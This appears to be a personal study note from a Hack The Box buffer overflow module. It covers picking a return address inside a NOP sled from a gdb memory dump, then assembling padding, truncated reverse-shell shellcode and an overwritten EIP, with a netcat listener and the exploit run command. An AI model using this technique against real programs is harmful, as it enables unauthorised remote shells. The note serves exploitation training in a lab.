---
title: "Identify Return Address"
tags:
  - cs/hacking
  - cs/hacking/stack-overflow
  - cs/hacking/htb
programming-languages:
created: 2022-07-12
---
# Identify Return Address
---
We need a memory address where our NOPs are located to tell the EIP to jump to it. It must not contain any of the bad characters found.

- NOPS:
```bash
(gdb) x/2000xb $esp+1400

<SNIP>
0xffffd5ec:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5f4:	0x55	0x55	0x55	0x55	0x55	0x55	0x90	0x90
								# End of "\x55"s   ---->|  |---> NOPS
0xffffd5fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd604:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd60c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd614:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd61c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd624:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd62c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd634:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd63c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd644:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd64c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd654:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd65c:	0x90	0x90	0xda	0xca	0xba	0xe4	0x11	0xd4
						 # |---> Shellcode
<SNIP>
```

We have to choose an address to which we refer the **EIP** and which reads and executes one byte after the other starting at this address. In this example, we take `0xffffd64c`, it looks like this:

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_9.png)

We then replace our `\x66` which overwrites the EIP to tell it to jump to the `0xffffd64c` address:

```
Buffer = "\x55" * (1040 - 124 - 95 - 4) = 841
NOPs = "\x90" * 124
Shellcode = "\xda\xca\xba\xe4\x11\xd4...<SNIP>...\x5a\x22\xa2"
EIP = "\x4c\xd6\xff\xff"
```

Since our shellcode creates a reverse shell, we let **netcat** listen on port 31337:

```bash
nc -nlvp 31337
```

Then we run our exploit again:

```bash
(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
```